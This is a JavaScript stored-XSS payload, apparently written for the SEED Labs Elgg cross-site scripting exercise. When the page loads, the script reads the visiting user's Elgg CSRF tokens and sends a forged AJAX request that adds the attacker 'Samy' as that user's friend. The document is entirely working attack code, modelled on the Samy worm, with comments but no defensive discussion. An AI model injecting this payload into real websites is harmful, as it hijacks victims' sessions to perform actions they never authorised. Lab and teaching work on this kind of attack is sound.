<script type="text/javascript">
    window.onload = function () {
    // Retrieve Samy's GUID from `elgg.page_owner` (the profile owner)
    var samyGuid = elgg.page_owner.guid;

    // Retrieve the victim's session tokens from `elgg.security.token`
    var elggTs = elgg.security.token.__elgg_ts;
    var elggToken = elgg.security.token.__elgg_token;

    // Construct the GET request URL to add Samy as a friend
    var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=" + samyGuid +
    "&__elgg_ts=" + elggTs + "&__elgg_token=" + elggToken;

    // Create and send the forged AJAX GET request
    var Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send();
}
</script>

